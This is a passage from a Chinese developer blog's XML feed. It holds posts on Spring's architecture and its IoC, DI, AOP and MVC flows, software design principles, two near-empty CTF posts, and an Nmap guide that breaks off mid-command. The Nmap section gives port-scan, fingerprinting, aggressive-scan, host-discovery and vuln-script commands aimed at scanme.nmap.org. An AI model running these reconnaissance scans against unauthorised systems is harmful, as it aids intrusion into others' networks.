class="hljs-number">100%</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#c8c6c9</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-left-radius</span>: <span class="hljs-number">65px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-left-radius</span>: <span class="hljs-number">55px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#d0ced1</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-right-radius</span>: <span class="hljs-number">65px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-right-radius</span>: <span class="hljs-number">55px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">top</span>: -<span class="hljs-number">8px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">130px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span><span class="hljs-selector-pseudo">:before</span>,</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">border-top</span>: <span class="hljs-number">35px</span> solid transparent;</span><span class="language-css"><span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">35px</span> solid transparent;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><span class="language-css"><span class="hljs-attribute">border-left</span>: <span class="hljs-number">35px</span> solid <span class="hljs-number">#c8c6c9</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.ears-container</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">border-right</span>: <span class="hljs-number">35px</span> solid <span class="hljs-number">#c8c6c9</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.eyes-container</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">overflow</span>: hidden;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">30px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">106px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">53px</span>;</span><span class="language-css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><span class="language-css">-webkit-<span class="hljs-attribute">animation</span>: hideEye <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-moz-<span class="hljs-attribute">animation</span>: hideEye <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-o-<span class="hljs-attribute">animation</span>: hideEye <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css"><span class="hljs-attribute">animation</span>: hideEye <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.eyes-container</span> <span class="hljs-selector-class">.eye</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: relative;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">float</span>: left;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">50px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#c8c6c9</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: white;</span><span class="language-css">-webkit-<span class="hljs-attribute">animation</span>: blink <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-moz-<span class="hljs-attribute">animation</span>: blink <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-o-<span class="hljs-attribute">animation</span>: blink <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css"><span class="hljs-attribute">animation</span>: blink <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.eyes-container</span> <span class="hljs-selector-class">.eye</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">4px</span>;</span><span class="language-css"><span class="hljs-attribute">right</span>: <span class="hljs-number">14px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">12px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">12px</span>;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: inherit;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#838091</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.eyes-container</span> <span class="hljs-selector-class">.eye</span><span class="hljs-selector-pseudo">:last-child</span> &#123;</span><span class="language-css"><span class="hljs-attribute">float</span>: right;</span><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#d0ced1</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">66px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">32px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">48px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">16px</span>;</span><span class="language-css"><span class="hljs-attribute">z-index</span>: <span class="hljs-number">1</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> <span class="hljs-selector-class">.nose</span> &#123;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">15px</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-left-radius</span>: <span class="hljs-number">5px</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-right-radius</span>: <span class="hljs-number">5px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-left-radius</span>: <span class="hljs-number">25px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-right-radius</span>: <span class="hljs-number">25px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#838091</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> <span class="hljs-selector-class">.lip</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: relative;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">4px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">12px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">2px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#838091</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> <span class="hljs-selector-class">.lip</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">5px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#767385</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> <span class="hljs-selector-class">.phiz</span> <span class="hljs-selector-class">.mouth</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: relative;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">6px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">13px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: white;</span><span class="language-css"><span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid <span class="hljs-number">#838091</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-right-radius</span>: <span class="hljs-number">12px</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-left-radius</span>: <span class="hljs-number">12px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">900px</span>)&#123;</span><span class="language-css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">100px</span>;&#125;</span><span class="language-css"><span class="hljs-selector-class">.btn</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;&#125;</span><span class="language-css"></span><span class="language-css">&#125;</span><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></li><li><p>概览</p><p><img src="https://img-blog.csdnimg.cn/9e063cb390b94866ba886c40317ccfc3.png" alt="请添加图片描述"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day1</title>
    <link href="/2022/08/13/spring_day01/"/>
    <url>/2022/08/13/spring_day01/</url>
    
    <content type="html"><![CDATA[<h1 id="Day01—Spring预热"><a href="#Day01—Spring预热" class="headerlink" title="Day01—Spring预热"></a>Day01—Spring预热</h1><p>已经完成了基本，代码地址</p><p>Github:<a href="https://github.com/luelueking/My_Spring_Source">https://github.com/luelueking/My_Spring_Source</a></p><p>Gitee:<a href="https://gitee.com/luelueking/My_Spring_Source">https://gitee.com/luelueking/My_Spring_Source</a></p><p>不废话，直接进入正文！！！</p><p>[TOC]</p><h2 id="Spring的设计初衷"><a href="#Spring的设计初衷" class="headerlink" title="Spring的设计初衷"></a>Spring的设计初衷</h2><ul><li>根本使命：<strong>简化开发</strong></li><li>4个关键策略（如何完成使命）：<ul><li>基于POJO的轻量级和最小侵入性编程</li><li>通过依赖注入和面向接口实现松耦合</li><li>基于切面和惯性进行声明式编程</li><li>通过切面和模版减少样版式代码</li></ul></li><li>通过面相Bean(BOP)、依赖注入(DI)及面向切面(AOP)这三种方式兑现吹过的🐮</li></ul><h2 id="Spring的系统架构"><a href="#Spring的系统架构" class="headerlink" title="Spring的系统架构"></a>Spring的系统架构</h2><ul><li><p>核心容器</p><ul><li>spring-beans和spring-core：spring的核心模块，包含了控制反转（IoC）和依赖注入（DI）。<ul><li>BeanFactory用IoC对应用程序的配置和依赖性规范与实际的应用程序代码进行分离。</li><li>注：BeanFactory实例化后并不会实例化Bean</li></ul></li><li>spring-context：构建于核心模块之上，扩展了BeanFactory，为它添加了Bean生命周期控制、框架事件体系及资源加载透明化等功能。<ul><li>ApplicationContext是该模块的核心接口，其超类是BeanFactory,不同点在于ApplicationContext实例化后自动化对所有的单实例Bean进行实例化与依赖关系的装配，使之处于待用状态。</li></ul></li><li>Spring-context-support：对SpringIoC容器及IoC子容器的扩展支持</li><li>Spring-context-indexer：Spring类的管理组件和Classpath扫描组件</li><li>Spring-expression：统一表达式语言(EL)的扩展，可以查询、管理运行中的对象，同时也可以方便的调用对象方法、以及操作数组、集合等。</li></ul></li><li><p>AOP和设备支持</p><ul><li>spring-aop：另一个核心模块，AOP主要实现模块。</li><li>spring-aspects：集成自AspectJ框架，主要为Sping提供多种AOP实现方法。</li><li>spring-instrument：基于JavaSE中的java.lang.instrument进行设计的,应该算是AOP的一个支援模块，主要作用是JVM启用时生成的一个代理类。</li></ul></li><li><p>数据访问与集成</p><ul><li>spring-jdbc：Spring提供的JDBC抽象框架的主要实现模块，用于简化Spring JDBC操作。</li><li>spring-tx：Spring JDBC事务控制实现模块。</li><li>spring-orm：ORM框架支持模块，主要集成Hibernate,Java Persistence API(JPA)和Java Data Objects(JDO)用于资源管理、数据访问对象的实现和事务策略。</li><li>spring-oxm：提供一个抽象层以支撑OXM（Object和XML的映射）</li><li>spring-jms：能够发送和接受信息</li></ul></li><li><p>Web组件</p><ul><li>spring-web：Spring提供的最基础的Web支持，主要简历在核心容器之上，通过Servlet或者Listeners来初始化Ioc容器，也包含一些与Web相关的支持。</li><li>spring-webmvc：Spring MVC</li><li>spring-websocket：与Web前端进行全双工通信的协议。</li><li>spring-webflux：一个新的非堵塞函数式Reactive Web框架，可以用来构建异步的、非阻塞的、事件驱动的服务、扩展性非常好。</li></ul></li><li><p>通信报文</p><ul><li>spring-message：为Spring框架集成一些基础的报文传送应用。</li></ul></li><li><p>集成测试</p><ul><li>spring-test：提供测试支持</li></ul></li><li><p>集成兼容</p><ul><li>spring-framework-bom：主要解决Spring的不同模块依赖版本不同的问题</li></ul></li><li><p>模块之间依赖关系</p><p><img src="https://img-blog.csdnimg.cn/04b5b226e7174b52bc02410275c9975b.png" alt="在这里插入图片描述"></p></li></ul><h2 id="Spring-IoC运行时序"><a href="#Spring-IoC运行时序" class="headerlink" title="Spring IoC运行时序"></a>Spring IoC运行时序</h2><ul><li>IoC回顾：Inversion of Control 控制反转，就是把原来代码里需要实现的对象创建、依赖，反转给容器帮忙实现。</li></ul><p><img src="https://img-blog.csdnimg.cn/a1982e05ee9e4b5d833d511a717e5658.png" alt="在这里插入图片描述"></p><ul><li>这里我画了一张详细的时序图</li><li>简单概括就是三个基本步骤：<ul><li>初始化的入口由容器实现中的refresh()方法完成调用</li><li>对Bean定义载入IoC容器使用的方法是loadBeanDefinition()</li><li>注册之后就可以通过BeanFactory和ApplicationContext来享受SpringIoC的服务了</li></ul></li></ul><h2 id="Spring-DI运行时序"><a href="#Spring-DI运行时序" class="headerlink" title="Spring DI运行时序"></a>Spring DI运行时序</h2><ul><li><p>DI回顾：Dependency Injection 依赖注入</p></li><li><p>DI发生的时间：</p><ul><li>用户第一次调用getBean()方法时,IoC容器触发依赖注入</li><li>当用户在配置文件中将<bean>元素配置了lay-init&#x3D;false属性是，即让容器在解析注册Bean定义时进行预实例化，触发依赖注入（延时加载：可以提高第一次获取Bean的性能）</bean></li></ul></li><li><p>主要分为二个步骤：</p><ul><li>调用createBeanInstance()方法生成Bean所包含的Java对象实例</li><li>调用populateBean()方法对Bean属性的依赖注入进行处理</li></ul></li><li><p>IoC容器是如何将属性值注入Bean实例对象上的：</p><ul><li>对于集合类型的属性，将属性值解析为目标类型的结合后直接赋值给属性</li><li>对于非集合类型的属性，大量使用JDK的反射机制，通过属性的getter()方法获取指定属性注入前的值，同时调用属性的setter()方法为属性设置注入后的值</li></ul></li><li><p>详细时序图</p></li></ul><p><img src="https://img-blog.csdnimg.cn/c8b884c87f424dfdab7097d4504ae8a5.png" alt="在这里插入图片描述"></p><h2 id="Spring-AOP时序"><a href="#Spring-AOP时序" class="headerlink" title="Spring AOP时序"></a>Spring AOP时序</h2><ul><li>AOP回顾：Aspect Oriented Programming 面向切面编程，可以通过预编译和运行时的动态代理，实现在不修改源代码的情况下给程序动态统一添加功能。</li><li>大致步骤：<ul><li>BeanPostProcessor初始化</li><li>选择代理策略</li><li>调用代理方法</li><li>触发通知</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/f6808948e2d946c3bd20a8dd57a31b5e.png" alt="在这里插入图片描述"></p><h2 id="Spring-MVC时序"><a href="#Spring-MVC时序" class="headerlink" title="Spring MVC时序"></a>Spring MVC时序</h2><ul><li><p>一张经典图片回顾mvc的请求处理流程：</p></li><li><p><img src="https://img-blog.csdnimg.cn/2020072519232190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTMwMDQzNw==,size_16,color_FFFFFF,t_70" alt="img"></p></li><li><p>九大组件：</p><ul><li>HandlerMapping：用来查找Handler的，也就是处理器，可以是类也可以是方法。<ul><li>例子：标注了***@RequestMapping***的每个方法就可以看成一个Handler。</li><li>作用：找到请求对应的处理器Handler和Interceptor</li></ul></li><li>HandlerAdapter：适配器，因为Handler形式任意，但请求交给Servlet的方法节后都是doService(HttpServletRequest req,HttpServletResponse res)形式的，终究适配过程就是靠它。</li><li>HandlerExceptionResolver：处理Handler产生的异常情况的组件</li><li>ViewResolver：视图解析器。<ul><li>核心方法：resolveViewName(),一个参数是String类型ViewName，另一个是Locale</li><li>作用：将String类型的视图名和Locale解析为View类型的视图</li><li>默认情况下，会为我们自动配置一个InternalResourceViewResolver</li></ul></li><li>RequestToViewNameTranslator:从请求中获取ViewName。因为ViewResolver根据ViewName查找View，但有些Handler处理完成之后没有设置View和ViewName。</li><li>LocaleReslover：从请求中解析Locale。</li><li>ThemeResolver：解析主题的。</li><li>MultipartReslover：处理上传请求，通过将普通的请求包装成MultipartHttpServletRequest来实现（使其可以上传文件等等）。</li><li>FlashMapManager：管理FlashMap。<ul><li>什么是FlashMap：用于重定向时的参数传递</li></ul></li></ul></li><li><p>大致步骤可分为三步：</p><ul><li>ApplicationContext初始化时用Map保存所有的URL和Controller类的对应关系。</li><li>根据请求URL找到对应的Controller，并从Controller中找到处理请求的方法。</li><li>将Request参数绑定到方法的参数上，执行方法处理请求，并返回结果视图。</li></ul></li><li><p>时序图(画的好累🤮，但是为了职业素养)</p></li></ul><p><img src="https://img-blog.csdnimg.cn/1b8736233c2d4144bbdea5d88e5c5b58.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>软件架构设计原则迅速回忆</title>
    <link href="/2022/08/13/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%9B/"/>
    <url>/2022/08/13/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="软件架构设计原则"><a href="#软件架构设计原则" class="headerlink" title="软件架构设计原则"></a>软件架构设计原则</h1><h2 id="1-开闭原则"><a href="#1-开闭原则" class="headerlink" title="1.开闭原则"></a>1.开闭原则</h2><ul><li><p>是什么：开闭原则就是指一个软件实体应该对库欧战开放,对修改关闭。</p></li><li><p>为什么：提高软件系统的可复合性及可维护性。指导我们如何建立稳定、灵活的系统。</p></li><li><p>怎么做：</p><ul><li><p>例如版本更新，我们应尽可能不修改源代码，但是可以新增功能</p></li><li><p>稍微具体的例子：类实现了接口，那么我们想扩展其功能的时候，作一个实现了接口的类的子类就是个不错的方式。</p></li></ul></li></ul><h2 id="2-依赖倒置原则"><a href="#2-依赖倒置原则" class="headerlink" title="2.依赖倒置原则"></a>2.依赖倒置原则</h2><ul><li>是什么：细节依赖抽象</li><li>简单来说就是面向接口编程，先顶层再细节设计代码结构</li></ul><h2 id="3-单一职责原则"><a href="#3-单一职责原则" class="headerlink" title="3.单一职责原则"></a>3.单一职责原则</h2><ul><li>是什么：不要存在多于一个导致类变更的原因。</li><li>为什么：解藕</li></ul><h2 id="4-接口隔离原则"><a href="#4-接口隔离原则" class="headerlink" title="4.接口隔离原则"></a>4.接口隔离原则</h2><ul><li>是什么：用多个专门的接口，客户端不应该依赖它不需要的接口</li><li>怎么做：<ul><li>一个类对应另一个类的依赖应该建立在最小的接口之上</li><li>建立单一接口，不要建立庞大臃肿的接口</li><li>尽量细化接口，接口中的方法尽量少，不是越少越好</li></ul></li></ul><h2 id="5-迪米特原则（最少知道原则）"><a href="#5-迪米特原则（最少知道原则）" class="headerlink" title="5.迪米特原则（最少知道原则）"></a>5.迪米特原则（最少知道原则）</h2><ul><li>是什么：一个对象应该对其他对象保持最少的了解</li><li>为什么：降低耦合</li><li>强调：只和朋友交流，不和陌生人说话。出现在成员变量、方法的输入、输出参数中的类都可以称之为朋友类，反之不是。</li></ul><h2 id="6-里氏替换原则"><a href="#6-里氏替换原则" class="headerlink" title="6.里氏替换原则"></a>6.里氏替换原则</h2><ul><li>一句话：子类可以扩展父类的功能，但不能改变父类的原有功能</li><li>为什么：约束继承泛滥，加强程序健壮性</li><li>怎么做：<ul><li>子类可以实现父类的抽象方法，但不能覆盖父类的非抽象方法。</li><li>子类可以增加自己特有的方法。</li><li>当子类的方法重载父类的方法时，方法的前置条件（方法的输入&#x2F;参数）要比父类方法的输入参数更宽松</li><li>当子类实现父类方法时，方法的后置条件（方法的输出&#x2F;返回值）要比父类更严格或与父类一样</li></ul></li></ul><h2 id="7-合成复用原则"><a href="#7-合成复用原则" class="headerlink" title="7.合成复用原则"></a>7.合成复用原则</h2><ul><li><p>是什么：尽量使用对象组合&#x2F;聚合而不是继承关系达到软件复用的目的。</p></li><li><p>为什么：可以使系统更加灵活</p></li><li><p>怎么做：来个例子（以数据库为例）</p><ul><li><div class="code-wrapper"><pre><code class="java">public class DBConnection&#123;    public String getConnection()&#123;    return &quot;Mysql数据库连接&quot;;  &#125;&#125;<pre><code class="hljs csharp">- ```java  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ProductDao</span>&#123;    <span class="hljs-keyword">private</span> DBConnection dbConnection;<span class="hljs-comment">//这里就体现了合成复用原则</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setDbConnection</span>(<span class="hljs-params">DBConnection dbConnection</span>)</span>&#123;      <span class="hljs-keyword">this</span>.dbConnection = dbConnection;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addProduct</span>()</span>&#123;      String conn = dbConnection.getConnection();      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;使用&quot;</span>+cnn+<span class="hljs-string">&quot;增加产品&quot;</span>);    &#125;  &#125;</code></pre></div></code></pre></li><li><p>当然有些违背了其他原则，但为了突出合成复用原则，这里不做扩展。实际开发过程中，也不必刻意追求完美，学会平衡取舍，写出优雅。</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/08/10/CTF_show_Web%E5%85%A5%E9%97%A8_phpCVE/"/>
    <url>/2022/08/10/CTF_show_Web%E5%85%A5%E9%97%A8_phpCVE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_nodejs</title>
    <link href="/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/"/>
    <url>/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs.html">http://118.178.126.49/blogs/CTF_show_Web入门_nodejs.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nmap使用姿势</title>
    <link href="/2022/07/26/nmap%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <url>/2022/07/26/nmap%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmap使用姿势"><a href="#Nmap使用姿势" class="headerlink" title="Nmap使用姿势"></a>Nmap使用姿势</h1><h3 id="列举远程机器开放的端口"><a href="#列举远程机器开放的端口" class="headerlink" title="列举远程机器开放的端口"></a>列举远程机器开放的端口</h3><ul><li><p>例：<code>nmap scanme.nmap.org</code>（扫描）</p></li><li><p>例：<code>nmap --dns-servers 8.8.8.8 scanme.nmap.org</code>（–dns-server指定dns服务器进行解析）</p></li><li><p>例：<code>nmap Pn scanme.nmap.org</code>（-Pn参数来停止探测之前的ICMP请求，防止防火墙突破）</p></li><li><p>例：<code>nmap -p 1-1000 scanme.nmap.org</code>（-p m-n 指定端口范围为m到n）</p></li><li><div class="code-wrapper"><pre><code class="hljs">端口状态：- Open 开放- Closed 关闭- Filtered 过滤无法收到返回的probe状态- UnFiltered 端口收到返回的probe，但无法确认</code></pre></div></li></ul><h3 id="识别服务指纹"><a href="#识别服务指纹" class="headerlink" title="识别服务指纹"></a>识别服务指纹</h3><ul><li>识别机器的服务信息: <code>nmap -sV IP地址</code></li><li>侵略性探测: <code>nmap -A -v -T4 IP地址</code></li><li>侵略性探测: <code>nmap  -sC -sV -O IP地址</code><ul><li>-sC：使用脚本探测</li><li>-sV：探测目标机器的服务信息</li><li>-O：探测目标机器的操作系统信息</li></ul></li></ul><h3 id="发现局域网中存活主机"><a href="#发现局域网中存活主机" class="headerlink" title="发现局域网中存活主机"></a>发现局域网中存活主机</h3><ul><li><p>对网络中所有主机进行ping扫描，以探测主机存活性</p><ul><li><code>nmap -sP CIDR </code></li><li><code>nmap -sn CIDR</code></li></ul></li><li><p>nmap -sn CIDR -oX test.xml    结果输出到test.xml</p></li></ul><h3 id="端口探测技巧"><a href="#端口探测技巧" class="headerlink" title="端口探测技巧"></a>端口探测技巧</h3><ul><li><p>对某个端口进行探测</p><ul><li><code>nmap -p80 scanme.nmap.org</code></li><li><code>nmap -p80,135 scaneme.nmap.org</code></li></ul></li><li><p>对某个范围端口进行探测</p><ul><li><code>nmap -p 1-100 scanme.nmap.org</code></li></ul></li><li><p>指定协议探测端口</p><ul><li><code>nmap -p T:25,U:53 scanme.nmap.org</code>（T：TCP，U：UDP）</li></ul></li><li><p>通过协议名扫描端口</p><ul><li><code>nmap -p smtp scanme.nmap.org</code></li></ul></li><li><p>通过名称范围扫描</p><ul><li><code>nmap -p s* scanme.nmap.org</code></li></ul></li><li><p>扫描注册在nmap中的端口</p><ul><li><code>nmap -p [1-65535] scanme.nmap.org</code></li></ul></li></ul><h3 id="NSE脚本"><a href="#NSE脚本" class="headerlink" title="NSE脚本"></a>NSE脚本</h3><ul><li><p>使用 –script参数来指定调用的脚本,并且将脚本存储在Nmap安装路径下的script文件夹下面，对于kali linux存储在&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;script&#x2F;下</p><ul><li><code>nmap --script http-headers scanme.nmap.org </code>（探测http请求头）</li><li><code>nmap -sV --script vuln 